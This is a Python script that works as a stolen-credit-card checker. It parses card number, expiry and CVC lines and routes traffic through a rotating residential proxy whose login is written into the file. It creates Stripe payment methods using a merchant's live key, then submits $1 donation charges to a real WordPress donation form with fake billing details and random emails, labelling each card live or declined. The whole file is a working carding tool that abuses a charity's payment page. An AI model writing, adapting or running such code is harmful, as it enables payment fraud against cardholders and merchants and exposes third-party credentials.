import requests, re
import random
import string
import time
from requests.adapters import HTTPAdapter
from urllib3.util.retry import Retry

# ==========================================
# 👇 PROXY SETTINGS (GATE 1)
# ==========================================
PROXY_HOST = 'geo.g-w.info'
PROXY_PORT = '10080'
PROXY_USER = 'user-RWTL64GEW8jkTBty-type-residential-session-d36whbp2-country-US-city-San_Francisco-rotation-15'
PROXY_PASS = 'EJJT0uWaSUv4yUXJ'

proxy_url = f"http://{PROXY_USER}:{PROXY_PASS}@{PROXY_HOST}:{PROXY_PORT}"
proxies = {
    'http': proxy_url,
    'https': proxy_url
}

def Tele(ccx):
    try:
        ccx = ccx.strip()
        n = ccx.split("|")[0]
        mm = ccx.split("|")[1]
        yy = ccx.split("|")[2]
        cvc = ccx.split("|")[3]

        if "20" in yy:
            yy = yy.split("20")[1]

        letters = string.ascii_lowercase + string.digits
        random_name = ''.join(random.choice(letters) for i in range(10))
        random_email = f"{random_name}@gmail.com"

        # 🔥 RETRY SYSTEM
        session = requests.Session()
        retry = Retry(
            total=3, 
            backoff_factor=1, 
            status_forcelist=[500, 502, 503, 504]
        )
        adapter = HTTPAdapter(max_retries=retry)
        session.mount('http://', adapter)
        session.mount('https://', adapter)
        session.proxies = proxies

        # ==========================================
        # Step 1: Create Payment Method (Stripe)
        # ==========================================
        headers_stripe = {
            'authority': 'api.stripe.com',
            'accept': 'application/json',
            'accept-language': 'en-US,en;q=0.9',
            'content-type': 'application/x-www-form-urlencoded',
            'origin': 'https://js.stripe.com',
            'referer': 'https://js.stripe.com/',
            'sec-ch-ua': '"Chromium";v="137", "Not/A)Brand";v="24"',
            'sec-ch-ua-mobile': '?1',
            'sec-ch-ua-platform': '"Android"',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'same-site',
            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
        }

        data_stripe = f'type=card&card[number]={n}&card[cvc]={cvc}&card[exp_month]={mm}&card[exp_year]={yy}&guid=NA&muid=NA&sid=NA&payment_user_agent=stripe.js%2Ff4aa9d6f0f%3B+stripe-js-v3%2Ff4aa9d6f0f%3B+card-element&key=pk_live_51ImsEfJNItPHf13dO6uJOlKF6sKjnrHHEGhTFlrH6OeJscyZ1tVPZ4aDbBUl9dDbDpoAGx2ph3cTY1UOvZim0lwe00APDN2NYM'

        response_stripe = session.post(
            'https://api.stripe.com/v1/payment_methods', 
            headers=headers_stripe, 
            data=data_stripe, 
            timeout=60
        )
        
        try: 
            json_response = response_stripe.json()
        except: 
            return "Proxy Error (Invalid JSON) ❌"

        # Check Stripe Errors
        if 'error' in json_response:
            code = json_response['error'].get('code')
            if code in ['incorrect_number', 'invalid_number']:
                return "Invalid Card Number ❌"
            elif code == 'invalid_expiry_month':
                return "Invalid Expiry Date ❌"
            elif code == 'invalid_cvc':
                return "Invalid CVC ❌"
            else:
                return f"Stripe Error: {code} ❌"

        if 'id' not in json_response:
            return "Proxy Error (PM Failed) ❌"
            
        pm = json_response['id']

        # ==========================================
        # Step 2: Charge Request (pmdk.org)
        # ==========================================
        headers_charge = {
            'authority': 'pmdk.org',
            'accept': 'application/json, text/javascript, */*; q=0.01',
            'accept-language': 'en-US,en;q=0.9',
            'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
            'origin': 'https://pmdk.org',
            'referer': 'https://pmdk.org/become-our-patreon/',
            'sec-ch-ua': '"Chromium";v="137", "Not/A)Brand";v="24"',
            'sec-ch-ua-mobile': '?1',
            'sec-ch-ua-platform': '"Android"',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'same-origin',
            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
            'x-requested-with': 'XMLHttpRequest',
        }

        data_charge = {
            'action': 'wp_full_stripe_inline_donation_charge',
            'wpfs-form-name': 'We_Care',
            'wpfs-form-get-parameters': '%7B%7D',
            'wpfs-custom-amount': '1.00',
            'wpfs-donation-frequency': 'monthly',
            'wpfs-custom-input[]': [
                'Genius ',
                '+13125550124',
                '13125550124',
            ],
            'wpfs-billing-name': '6',
            'wpfs-billing-address-line-1': 'Street 2',
            'wpfs-billing-address-city': 'New York',
            'wpfs-billing-address-state': 'New Yok',
            'wpfs-billing-address-zip': '10080',
            'wpfs-billing-address-country': 'US',
            'wpfs-card-holder-email': random_email,
            'wpfs-card-holder-name': 'Z',
            'wpfs-custom-amount-index': '0',
            'wpfs-stripe-payment-method-id': f'{pm}',
        }

        response_charge = session.post(
            'https://pmdk.org/wp-admin/admin-ajax.php', 
            headers=headers_charge, 
            data=data_charge, 
            timeout=60
        )
        
        try: 
            result = response_charge.json().get('message', 'Decline⛔')
        except:
            if "Cloudflare" in response_charge.text or response_charge.status_code == 403: 
                result = "IP Blocked by Site ❌"
            else: 
                result = "Decline⛔"
                
    except Exception as e:
        result = f"Connection Failed (Retry Limit) ⚠️"
        
    return result
